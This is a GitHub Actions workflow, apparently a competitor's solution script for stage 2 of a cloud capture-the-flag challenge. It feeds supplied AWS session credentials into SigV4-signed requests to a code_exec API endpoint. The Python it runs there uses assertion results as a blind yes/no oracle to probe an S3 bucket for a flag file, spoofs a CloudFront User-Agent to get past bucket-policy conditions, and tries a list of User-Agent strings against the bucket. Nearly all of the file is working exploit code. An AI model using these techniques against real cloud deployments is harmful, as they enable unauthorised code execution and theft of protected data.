name: Cloud Escape - Stage 2 (Miss Me Yet?)
run-name: Stage 2 - participant STS → code_exec
#
# CRITICAL FINDING (GHA run 30890450186):
#   cicdRole (OIDC / Stage 1) is NOT authorized to invoke
#   https://l8ssyaz69f.execute-api.us-east-1.amazonaws.com/dev/code_exec
# Stage 2 must use platform ctf_participant_role STS (paste below or as secrets).
#
on:
  workflow_dispatch:
    inputs:
      aws_access_key_id:
        description: "Participant AWS_ACCESS_KEY_ID (ASIA...)"
        required: true
      aws_secret_access_key:
        description: "Participant AWS_SECRET_ACCESS_KEY"
        required: true
      aws_session_token:
        description: "Participant AWS_SESSION_TOKEN"
        required: true

permissions:
  contents: read

jobs:
  stage2-participant-exploit:
    runs-on: ubuntu-latest
    steps:
      - name: "1) Configure participant STS"
        env:
          AWS_ACCESS_KEY_ID: ${{ inputs.aws_access_key_id }}
          AWS_SECRET_ACCESS_KEY: ${{ inputs.aws_secret_access_key }}
          AWS_SESSION_TOKEN: ${{ inputs.aws_session_token }}
          AWS_DEFAULT_REGION: us-east-1
        run: |
          set -e
          echo "=== IDENTITY (must be ctf_participant_role) ==="
          aws sts get-caller-identity
          echo "=== LOG BUCKET (should work) ==="
          aws s3api list-objects-v2 --bucket logd8a2f72fe43094e8 --max-items 3 --query 'KeyCount' --output text
          echo "=== USER BUCKET (expect AccessDenied) ==="
          aws s3api list-objects-v2 --bucket userd8a2f72fe43094e8 --max-items 1 2>&1 | head -5 || true

      - name: "2) code_exec path-style exploit probes"
        env:
          AWS_ACCESS_KEY_ID: ${{ inputs.aws_access_key_id }}
          AWS_SECRET_ACCESS_KEY: ${{ inputs.aws_secret_access_key }}
          AWS_SESSION_TOKEN: ${{ inputs.aws_session_token }}
          AWS_DEFAULT_REGION: us-east-1
        run: |
          pip install botocore -q
          python3 << 'PY'
          import json, base64, os, urllib.request, urllib.error, time
          from botocore.auth import SigV4Auth
          from botocore.awsrequest import AWSRequest
          from botocore.credentials import Credentials

          API = "https://l8ssyaz69f.execute-api.us-east-1.amazonaws.com/dev/code_exec"
          USER = "userd8a2f72fe43094e8"
          OK = '{"result":"Code executed successfully"}'
          FAIL = '{"error":"Something went wrong!"}'
          creds = Credentials(
              os.environ["AWS_ACCESS_KEY_ID"],
              os.environ["AWS_SECRET_ACCESS_KEY"],
              os.environ["AWS_SESSION_TOKEN"],
          )
          AK, SK, TK = (
              os.environ["AWS_ACCESS_KEY_ID"],
              os.environ["AWS_SECRET_ACCESS_KEY"],
              os.environ["AWS_SESSION_TOKEN"],
          )

          def exec_code(code, timeout=30):
              b64 = base64.b64encode(code.encode()).decode()
              payload = json.dumps({"code": b64})
              r0 = AWSRequest(method="POST", url=API, data=payload,
                              headers={"Content-Type": "application/json"})
              SigV4Auth(creds, "execute-api", "us-east-1").add_auth(r0)
              req = urllib.request.Request(API, data=payload.encode(),
                                           headers=dict(r0.headers), method="POST")
              try:
                  with urllib.request.urlopen(req, timeout=timeout) as r:
                      return r.read().decode().strip()
              except Exception as e:
                  return e.read().decode().strip() if hasattr(e, "read") else str(e)

          def maj(code, tries=5):
              votes = []
              for _ in range(tries):
                  b = exec_code(code)
                  if b == OK:
                      votes.append(True)
                  elif b == FAIL:
                      votes.append(False)
                  else:
                      print("junk", b[:140].replace("\n", " "))
                      time.sleep(0.2)
                      continue
                  if len(votes) >= 3 and len(set(votes[-3:])) == 1:
                      return votes[-1]
              return max(set(votes), key=votes.count) if votes else None

          print("smoke pass", maj("pass"), "fail", maj("assert False"))
          print("path 403", maj("""
          import urllib.request, urllib.error
          req=urllib.request.Request('https://s3.us-east-1.amazonaws.com/userd8a2f72fe43094e8/flag.txt',headers={'User-Agent':'x'})
          try:
              urllib.request.urlopen(req,timeout=8)
              assert False
          except urllib.error.HTTPError as e:
              assert e.code==403
          """))
          print("virt URLError", maj("""
          import urllib.request, urllib.error
          req=urllib.request.Request('https://userd8a2f72fe43094e8.s3.us-east-1.amazonaws.com/flag.txt',headers={'User-Agent':'x'})
          try:
              urllib.request.urlopen(req,timeout=6)
              assert False
          except urllib.error.URLError as e:
              assert not isinstance(e, urllib.error.HTTPError)
          """))
          print("lambda identity deny", maj("""
          import boto3
          from botocore.config import Config
          from botocore.exceptions import ClientError
          s3=boto3.client('s3',region_name='us-east-1',endpoint_url='https://s3.us-east-1.amazonaws.com',
            config=Config(s3={'addressing_style':'path'},connect_timeout=3,read_timeout=5,retries={'max_attempts':1}))
          try:
              s3.get_object(Bucket='userd8a2f72fe43094e8',Key='flag.txt')
              assert False
          except ClientError as e:
              assert 'identity-based' in e.response.get('Error',{}).get('Message','')
          """))
          print("participant-in-lambda resource deny", maj(f"""
          import boto3
          from botocore.config import Config
          from botocore.exceptions import ClientError
          s3=boto3.client('s3',region_name='us-east-1',
            aws_access_key_id={AK!r},aws_secret_access_key={SK!r},aws_session_token={TK!r},
            endpoint_url='https://s3.us-east-1.amazonaws.com',
            config=Config(s3={{'addressing_style':'path'}},connect_timeout=3,read_timeout=5,retries={{'max_attempts':1}}))
          def set_ua(request,**kw):
              request.headers['User-Agent']='Amazon CloudFront'
          s3.meta.events.register('before-send.s3.*', set_ua)
          try:
              s3.get_object(Bucket='userd8a2f72fe43094e8',Key='flag.txt')
              assert False
          except ClientError as e:
              assert 'resource-based' in e.response.get('Error',{{}}).get('Message','')
          """))

          # Stmt2: UNSIGNED path-style batch (targeted UAs only)
          uas = [
              "Amazon CloudFront","CloudFront","AmazonS3","aws-internal/3",
              "junior_developer","Miss Me Yet?","???","Test Site",
              "System Documentation","This is me","pretty sure I deleted it all",
              "I had a lot of fun doing it!","REDACTED","bucket_policy.json","",
          ]
          print("unsigned batch", maj(f"""
          import urllib.request, json
          uas=json.loads({json.dumps(uas)!r})
          hit=False
          for ua in uas:
              req=urllib.request.Request(
                'https://s3.us-east-1.amazonaws.com/userd8a2f72fe43094e8/flag.txt',
                headers={{'User-Agent':ua}})
              try:
                  with urllib.request.urlopen(req,timeout=2.5) as r:
                      if r.status==200 and len(r.read())>0:
                          hit=True
                          break
              except Exception:
                  pass
          assert hit
          """))
          print("DONE")
          PY
